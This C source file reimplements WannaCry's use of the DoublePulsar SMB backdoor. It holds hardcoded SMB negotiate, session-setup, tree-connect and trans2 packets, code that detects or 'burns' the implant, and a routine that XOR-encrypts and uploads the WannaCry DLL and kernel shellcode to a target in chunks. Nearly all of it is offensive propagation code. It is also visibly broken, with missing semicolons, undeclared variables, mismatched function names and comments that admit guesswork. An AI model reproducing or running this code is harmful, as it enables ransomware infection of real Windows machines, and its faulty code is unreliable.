//To determine if DoublePulsar is present
unsigned char SmbNegociate[] =
"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x88\x05\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54"
"\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00";

unsigned char Session_Setup_AndX_Request[] =
"\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00"
"\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\xff\xff\x88\x05\x00\x00\x00\x00\x0d\xff\x00\x00\x00\xff"
"\xff\x02\x00\x88\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x01\x00\x00\x00\x0b\x00\x00\x00\x6e\x74\x00\x70\x79\x73\x6d"
"\x62\x00";

unsigned char treeConnectRequest[] =
"\x00\x00\x00\x58\xff\x53\x4d\x42\x75\x00"
"\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\xff\xfe\x00\x08\x00\x03\x04\xff\x00\x58\x00\x08"
"\x00\x01\x00\x2d\x00\x00\x5c\x00\x5c\x00\x31\x00\x37\x00\x32\x00"
"\x2e\x00\x32\x00\x32\x00\x2e\x00\x35\x00\x2e\x00\x34\x00\x36\x00"
"\x5c\x00\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00\x3f\x3f\x3f\x3f"
"\x3f\x00";

unsigned char trans2_session_setup[] =
"\x00\x00\x00\x4E\xFF\x53\x4D\x42\x32\x00\x00\x00\x00\x18\x07\xC0"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE"
"\x00\x08\x41\x00\x0F\x0C\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
"\x00\xA6\xD9\xA4\x00\x00\x00\x0C\x00\x42\x00\x00\x00\x4E\x00\x01"
"\x00\x0E\x00\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00"

unsigned int LE2INT(unsigned char *data)
{
            unsigned int b;
            b = data[3];
            b <<= 8;
            b += data[2];
            b <<= 8;
            b += data[1];
            b <<= 8;
            b += data[0];
            return b;
}	
	
unsigned int ComputerDOUBLEPULSARXorKey(unsigned int key)
{
	return 2 * key ^ ((((key >> 16) | key & 0xFF0000) >> 8) | (((key << 16) | key & 0xFF00) << 8));
}

int xor_payload(int xor_key, int buf, int size)
{
	int i;
	char __xor_key[5];
	i = 0;
	*&__xor_key[1] = 0;
	*__xor_key = xor_key;
	if (size <= 0)
		return 0;
	do
	{
		*(i + buf) ^= __xor_key[i % 4];
		++i;
	} while ( i < size );
	return 0;
}

int IsDOUBLEPULSARInstalled(char *host, int flagUninstall, u_short hostshort)
{
	SOCKET dsock;
	struct sockaddr name;
	char userid[2];
   	char treeid[2];
	char recvbuff[1024];

	name.sin_family = AF_INET;
    	name.sin_addr.s_addr = inet_addr(host);
    	name.sin_port = htons(hostshort);
	dsock = socket(AF_INET, SOCK_STREAM, 0);
	connect(dsock, (struct sockaddr*) &name, sizeof(name));
	
	//send SMB negociate packet
	send(dsock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	//send Session Setup AndX request
	send(dsock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	//copy userID from recvbuff @ 32,33
	userid[0] = recvbuff[32];
	userid[1] = recvbuff[33];
	
	//update userID in the tree connect request
    	treeConnectRequest[32] = userid[0];
    	treeConnectRequest[33] = userid[1];
	send(dsock, (char*)treeConnectRequest, sizeof(treeConnectRequest) - 1, 0);
	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	//copy treeID from recvbuff @ 28, 29
    	treeid[0] = recvbuff[28];
   	treeid[1] = recvbuff[29];
	
	trans2_session_setup[28] = treeid[0];
        trans2_session_setup[29] = treeid[1]
        trans2_session_setup[32] = userid[0];
        trans2_session_setup[33] = userid[1];

	send(dsock, (char*)trans2_session_setup, sizeof(trans2_session_setup) - 1, 0);
	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	if (recvbuff[34] == 0x51)
	{
		if ( flagUninstall )
		{
			WORD burn1, burn2, burn3, burn4, burn5;

		    	burn1 = 66;       //update multiplex ID to x42
		    	burn2 = 14;       //burn command - trans2_session_setup[49] = "\x0e"
		    	burn3 = 105;      //burn command - trans2_session_setup[50] = "\x69"
		    	burn4 = 0;        //burn command - trans2_session_setup[51] = "\x00"
		    	burn5 = 0;        //burn command - trans2_session_setup[52] = "\x00"

		    	//modify our trans2 session packet to include the burn command
		    	memcpy(trans2_session_setup + 0x22, (char*)&burn1, 1);
		    	memcpy(trans2_session_setup + 0x31, (char*)&burn2, 1);
		    	memcpy(trans2_session_setup + 0x32, (char*)&burn3, 1);
		    	memcpy(trans2_session_setup + 0x33, (char*)&burn4, 1);
		    	memcpy(trans2_session_setup + 0x34, (char*)&burn5, 1);
			send(dsock, (char*)trans2_session_setup, sizeof(trans2_session_setup) - 1, 0);
            		recv(dsock, (char*)uninstall_response, 1024, 0);
			closesocket(dsock);
			return 1;
		}
		closesocket(dsock);
	}
	return 0;
}

int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int xkey)
{
	/*
	DWORD WannacryFileSize = value of -> ReadFile Wannacry EXE into -> EXE_BUFFER_SOMEWHERE
	DWORD totalPayloadSize_x86 = 0x4060 + 0x1305 + WannacryFileSize;
	DWORD totalPayloadSize_x64 = 0xc8a4 + 0x1800 + WannacryFileSize;
	*/
	
	/*
	/*
	32-bit dll start address 0x40B020, size is 0x4060 bytes
	64-bit dll start address 0x40F080, size is 0xc8a4 bytes
	32-bit shellcode start address 0x42E758, size is 0x1305 bytes
	64-bit shellcode start address 0x42FA60, size 0x1800 bytes
	*/
	const void *rundll_shellcode;
	char *DLLPayload;
	int shellcode_payload_size;
	int DLLSize;
	int total_size;
	if(architectureType)
	{
		//32 bits
		Payload = &hDLL_x86;
		shellcode_payload_size = 0x1305; //decimal: 4869
		PayloadSize = 0x50D800;
	}
	else
	{
		//64 bits
		Payload = &hDLL_x64;
		shellcode_payload_size = 0x1800; //decimal: 6144
		PayloadSize = 0x50D800;
	}
	
	HGLOBAL hMem = GlobalAlloc(GMEM_ZEROINIT, shellcode_payload_size + PayloadSize + 12);
	
	//could be wrong but copied from IDA
	//looks like the DLL is added to the hMem location right after the runDLL shellcode
	memcpy(hMem + shellcode_payload_size, Payload, PayloadSize);
	
	//not sure what is going on here, but looks like the total_size is getting populated here
	/* Kept for historical purposes but most likely WRONG
	if (&DLLPayload[shellcode_payload_size] % 4)
	{
		 total_size = 4 * ((signed int)DLLPayload[shellcode_payload_size] / 4) + 4;
	}
	else
	{
		total_size = DLLPayload[shellcode_payload_size];
	}*/
	if ( PayloadSize + shellcode_payload_size % 4) {
		total_size = 4 * ((5298176 + 6144) / 4) + 4;
	}
	else {
		total_size = 0x50D800 + 0x1800;
	}
	
	if(architectureType)
	{
		//32 bits
		rundll_shellcode = &x86_kernel_shellcode;
		
	}
	else
	{
		//64 bits
		rundll_shellcode = &x64_kernel_shellcode;
		
		//shellcode must be patched in 3 areas
		/* 1.) Kernel shellcode must be updated to include the DLL size + Userland shellcode size
		for proper allocation in memory
		*/
		DWORD DLL_and_UserlandShellcodeSize = 0x50D800 + 3978;
		*(DWORD*)&x64_kernel_shellcode[0x86E] = DLL_and_UserlandShellcodeSize;
		//x64_kernel_shellcode[2158] = 
		
		/* Userland shellcode DLL size len */
		/* this value was obtained from subtracting the Userland shellcode size from the Total size of the entire shellcode
		so...if entire shellcode size is 6144 or 0x1800
		and if userland shellcode is 3978, then kernel shellcode size is 2166
		*/
		*(DWORD*)&x64_kernel_shellcode[2166+0xf82] = 0x50D800;
		//6136
		
		/* Userland shellcode DLL ordinal to call */
		*(DWORD*)&x64_kernel_shellcode[2166+0xf86] = 1; //default already set to 1
		//6140
	}
	memcpy(hMem, rundll_shellcode, shellcode_payload_size);
	xor_payload(xkey, hMem, total_size);
	memcpy(send_buffer, wannacry_trans2_exec_packet, 70);
	
	v9 = total_size / 4096;
	v10 = total_size % 4096;
	
	/* may be needed for signature
	#define __PAIR__(high, low) (((unsigned long)(high)<<sizeof(high)*8) | low)
	
	sources:
	https://www.cnblogs.com/shangdawei/p/3537773.html
	#define _DWORD uint32
        #define _QWORD uint64
	https://www.cnblogs.com/goodhacker/p/7692443.html
	https://cloud.tencent.com/developer/article/1432392
	https://github.com/nihilus/hexrays_tools/blob/master/code/defs.h
	*/
	
	int ctx = 0; //offset counter
	char Parametersbuffer[12];
	
	//the payload size doesn't change, but this is determined by the shellcode + DLL payload
	//change this to dynamically change based on the size of the payload
	unsigned int xor_payload_size = total_size ^ xkey; 
	unsigned int chunk_size = 4096 ^ xkey; //chunk size but encrypted with XOR key
	unsigned int o_offset = 0 ^ xkey; //offset counter but encrypted with XOR key
	unsigned int bytesLeft = total_size; //Bytes Left counter
	//WILL verify why wannacry in IDA says: shellcode_payload_size + DLLSize + 12
	//OR use this:
	//unsigned int bytesLeft = sizeof(hMem)/sizeof(hMem[0]);
	if(total_size / 4096 > 0)
	{
		for(i=0; ; ctx=i)
		{
			o_offset = ctx ^ xkey;
			memcpy(Parametersbuffer, (char*)&xor_payload_size, 4);
			memcpy(Parametersbuffer + 4, (char*)&chunk_size, 4);
			memcpy(Parametersbuffer + 8, (char*)&o_offset, 4);
			
			//size 70
			memcpy(send_buffer, wannacry_Trans2_Request, sizeof(wannacry_Trans2_Request));
			//copy parameters
			memcpy(send_buffer + 70 , Parametersbuffer, 12);
			//copy 4096 bytes of payload
			memcpy(send_buffer + 82, (char *)hMem + ctx, 4096);
			send(socket, (char*)send_buffer, 4178, 0);
			recv(socket, (char*)recv_buffer, 4096, 0);
			if(recvbuff[34] != 82)
			{
				//error, doublePulsar should return 82
				break;
			}
			ctx += 4096; //increment counter 
			bytesleft -= 4096; //tracker to see how many bytes we have left
		}
	}
	
	if ( v10 > 0 )
	{
		//update chunk size to what's left in the encrypted payload buffer
		chunk_size = bytesLeft ^ xkey;
		//update offset by XORing the latest value
		o_offset = ctx ^ xkey;
		memcpy(Parametersbuffer, (char*)&xor_payload_size, 4);
		memcpy(Parametersbuffer + 4, (char*)&chunk_size, 4);
		memcpy(Parametersbuffer + 8, (char*)&o_offset, 4);
		//parameters are copied accurately to the buffer
		
		//size 70
		memcpy(send_buffer, wannacry_Trans2_Request, sizeof(wannacry_Trans2_Request));
		//update last packet SMB Length
		smblen = bytesLeft+70+12; //BytesLeft + DoublePulsar Exec Packet Length + Trans2 SESSION_SETUP parameters
		memcpy(send_buffer+3, &smblen, 1);

		//copy parameters
		memcpy(send_buffer + 70 , Parametersbuffer, 12);
		//copy last payload size = bytesLeft
		memcpy(send_buffer + 82, (char *)hMem + ctx, bytesLeft);
		send(socket, (char*)send_buffer, 4178, 0);
		recv(socket, (char*)recv_buffer, 4096, 0);
	}
	//This part of the code is for debug purposes
	if(recvbuff[34] == 82)
	{
			//DEBUG PURPOSE ONLY
			printf("Doublepulsar ran successfully!\n");
	}
	/////////////////////////////////////////////
	GlobalFree(hMem);
}

int runPayloadOnTarget(char *host, u_short hostshort)
{
	unsigned int signature_long;
	unsigned int XorKey;
	SOCKET dsock;
	struct sockaddr name;
	char userid[2];
   	char treeid[2];
	char recvbuff[1024];

	name.sin_family = AF_INET;
    	name.sin_addr.s_addr = inet_addr(host);
    	name.sin_port = htons(hostshort);
	dsock = socket(AF_INET, SOCK_STREAM, 0);
	connect(dsock, (struct sockaddr*) &name, sizeof(name));
	
	//send SMB negociate packet
	send(dsock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	//send Session Setup AndX request
	send(dsock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	//copy userID from recvbuff @ 32,33
	userid[0] = recvbuff[32];
	userid[1] = recvbuff[33];
	
	//update userID in the tree connect request
    	treeConnectRequest[32] = userid[0];
    	treeConnectRequest[33] = userid[1];
	send(dsock, (char*)treeConnectRequest, sizeof(treeConnectRequest) - 1, 0);
	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	//copy treeID from recvbuff @ 28, 29
    	treeid[0] = recvbuff[28];
   	treeid[1] = recvbuff[29];
	
	trans2_session_setup[28] = treeid[0];
        trans2_session_setup[29] = treeid[1]
        trans2_session_setup[32] = userid[0];
        trans2_session_setup[33] = userid[1];

	send(dsock, (char*)trans2_session_setup, sizeof(trans2_session_setup) - 1, 0);
	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	unsigned char signature[4];
	if (recvbuff[34] == 0x51)
	{
		ArchitectureType = int(recvbuff[22]);
		
		signature[0] = recvbuff[18];
		signature[1] = recvbuff[19];
		signature[2] = recvbuff[20];
		signature[3] = recvbuff[21];
		memcpy((unsigned int*)&signature_long, (unsigned int*)&signature, sizeof(unsigned int));
		XorKey = ComputeDOUBLEPULSARXorKey(signature_long);
		InjectWannaCryDLLViaDoublePulsarBackdoor(dsock, ArchitectureType, XorKey);
	}
	closesocket(dsock);
	return 0;
}
